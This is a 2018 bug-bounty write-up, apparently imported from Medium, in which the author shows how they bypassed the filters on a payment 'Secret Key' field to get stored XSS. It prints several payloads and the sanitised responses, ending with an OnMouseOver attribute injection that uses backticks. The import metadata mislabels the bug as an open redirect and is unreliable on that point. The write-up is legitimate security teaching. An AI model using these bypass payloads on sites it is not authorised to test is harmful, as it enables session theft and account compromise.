---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-04-30_story-of-a-stored-xss-bypass.md
original_filename: 2018-04-30_story-of-a-stored-xss-bypass.md
title: Story Of a Stored XSS Bypass
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: e3fd8f225aeeb9300e73aa05bc0e923e4cb7c38e8524d332a138bf84972a8f04
text_sha256: 3b3a7b31e836fc0544b36c112109d0567475b334470e4fb7bd22db820637b826
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Story Of a Stored XSS Bypass

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-04-30_story-of-a-stored-xss-bypass.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `e3fd8f225aeeb9300e73aa05bc0e923e4cb7c38e8524d332a138bf84972a8f04`
- Text SHA256: `3b3a7b31e836fc0544b36c112109d0567475b334470e4fb7bd22db820637b826`


## Content

---
title: "Story Of a Stored XSS Bypass"
url: "https://medium.com/@prial261/story-of-a-stored-xss-bypass-26e6659f807b"
authors: ["Prial Islam Khan (@prial261)"]
programs: ["Zerocopter"]
bugs: ["Open redirect"]
publication_date: "2018-04-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5892
scraped_via: "browseros"
---

# Story Of a Stored XSS Bypass

Top highlight

Prial Islam Khan
 highlighted

Story Of a Stored XSS Bypass
Prial Islam Khan
Follow
2 min read
·
Apr 21, 2018

545

4

Hi readers ,

I am a Cyber Security Researcher from Bangladesh . This is my 1st write-up and also I am not good at XSS so forgive all mistakes .

Recently I was testing a private site and in that site users can add their personal information . I noticed a Input there named Secret Key which allows user to process payments and store transaction information to an application.

Get Prial Islam Khan’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

So I input a Normal payload :-

“><img src=x onerror=prompt(document.domain)>

and it got filtered and the page source was like :-

<input type="text" id="****" name="****" value="">&lt;img img" class="form-control" rel="gp" data-size="20" data-character-set="a-z,A-Z,0-9">

So from the source I understand that :-

1. quot (“) and greater-than (>) signs are not being filtered properly .

2. Malicious tags are being filtered . For that <img> become img img

So I have 2 possible way to execute JavaScript . 1st one is somehow bypass the less than (<) filter and the 2nd one is adding a malicious HTML Attributes to execute JavaScript . I tried many way to bypass the less than(<) Character but was unable to do . So I processed with 2nd way by adding a Malicious HTML Attributes . So I entered below payload :-

“ OnMouseOver=prompt(1)

Response was :-

<input type="text" id="****" name="****" value="" OnMouseOver=prompt&#40;" class="form-control" rel="gp" data-size="20" data-character-set="a-z,A-Z,0-9">

So I was able to add a HTML Attributes but Brackets are being filtered properly . So I entered below payload :-

“ OnMouseOver=prompt`1`

Response was :-

<input type="text" id="****" name="****" value="" OnMouseOver=prompt`1`" class="form-control" rel="gp" data-size="20" data-character-set="a-z,A-Z,0-9">

But code Not executed . Take a closer look and the payload just need a quot (“) 🤔🤔🤔 :-

“ OnMouseOver=”prompt`1`

Response was :-

<input type="text" id="ipn_secret_keygen" name="ipn_secret_keygen" value=""OnMouseOver="alert`1`" class="form-control" rel="gp" data-size="20" data-character-set="a-z,A-Z,0-9">

Looks good . Now I took my Mouse pointer on the Input and the OnMouseOver Event executed the XSS Popup 🤩🤩🤩

Press enter or click to view image in full size
XSS Executed .

Thanks for reading . Hope will get time to write some more posts .

Find me on Facebook :-

Prial Islam Khan
Prial Islam Khan is on Facebook. Join Facebook to connect with Prial Islam Khan and others you may know. Facebook gives…

facebook.com
